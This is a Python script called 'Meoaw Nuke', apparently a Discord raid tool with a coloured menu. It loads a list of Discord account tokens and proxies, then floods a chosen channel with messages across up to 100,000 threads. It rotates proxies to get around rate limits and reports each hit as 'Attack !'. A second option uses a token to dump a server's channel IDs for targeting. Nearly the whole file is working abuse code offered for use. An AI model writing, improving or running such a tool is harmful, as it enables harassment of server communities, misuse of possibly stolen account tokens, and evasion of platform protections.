import gotji
import os
import requests
import time
import random
from pystyle import *
from time import sleep
from concurrent.futures import ThreadPoolExecutor

meoaw_ui = """


░▒█▀▄▀█░▄▀▀▄░█▀▀▄░░▀░░█░░█▀▀░░░▒█▄░▒█░█░▒█░█░▄░█▀▀░█▀▀▄
░▒█▒█▒█░█░░█░█▀▀▄░░█▀░█░░█▀▀░░░▒█▒█▒█░█░▒█░█▀▄░█▀▀░█▄▄▀
░▒█░░▒█░░▀▀░░▀▀▀▀░▀▀▀░▀▀░▀▀▀░░░▒█░░▀█░░▀▀▀░▀░▀░▀▀▀░▀░▀▀


"""

function = """
[ 1 ] Fast Nuke

[ 2 ] Multi Nuker

[ 3 ] Get id ( CH )
"""

ui_choice = "Function > "

def main():

    os.system('clear')

    Anime.Fade(Center.Center(meoaw_ui),Colors.rainbow,Colorate.Vertical,enter=True)

    print(Colorate.Horizontal(Colors.purple_to_blue, function, 1))

    print(" ")

    print(" ")

    choice = input(Colorate.Horizontal(Colors.blue_to_purple, ui_choice, 1))

    print(" ")

    if choice == "1":
                    
        os.system('clear')

        print(" ")

        amount = int(input("Count > "))

        print(" ")

        os.system('clear')

        print(" ")

        Write.Print("Load Setup...", Colors.yellow_to_red, interval=0.04)

        print(" ")

        sleep(0)

        print(" ")

        Write.Print("Start core !", Colors.cyan_to_green, interval=0.04)

        print(" ")

        sleep(0)

        os.system('clear')

        i = 0

        threading = ThreadPoolExecutor(max_workers=int(100000))

        while i < amount:

            i += 1

            threading.submit(attack)

        else:

            pass

    elif choice == "2":

        os.system('clear')

        print(" ")

        print("Use by 50 User to unlock this !")

        print(" ")

    elif choice == "3":

        os.system('clear')

        print(" ")

        print("Get id...")

        print(" ")

        sleep(0)

        token = gotji.main["token"]

        meoaw = requests.session()

        api = "v9"

        Server_id = gotji.main["sv_id"]

        response = meoaw.get(f"https://discord.com/api/{api}/guilds/{Server_id}/channels",headers={"authorization": token})

        with open('id.txt', 'a') as c:
                                
            for channels in response.json():

                c.write(channels['id']+"\n")

            else:

                os.system('clear')

                print(" ")

                print("Done !")

                print(" ")

def attack():

    db = open("token.txt", "r").readlines()

    db_ip = open("ip.txt", "r").readlines()

    for token in db:

        ip = random.choice(db_ip)

        chid = gotji.main["chid"]

        msg = gotji.main["msg"]

        token_real = token.replace("\n", "")

        try:

            meoaw = requests.session()

            meoaw01 = meoaw.post(f'https://discord.com/api/v9/channels/{chid}/messages', headers={'authorization': f'{token_real}'}, json={'content': f"{msg}"}, proxies={"http": ip, "https:": ip})

            if meoaw01.status_code == 200:

                print(" ")

                time_x = time.localtime()

                now = time.strftime("%B %d %Y %H:%M:%S", time_x)

                print(Colorate.Horizontal(Colors.rainbow, f"{now} | Status: Attack !", 1))

                print(" ")

            else:

                pass

        except:

            print(" ")

            print(Colorate.Horizontal(Colors.yellow_to_red, "[ Meoaw Nuke ] | Status: Rate ( By pass )", 1))

            print(" ")

main()
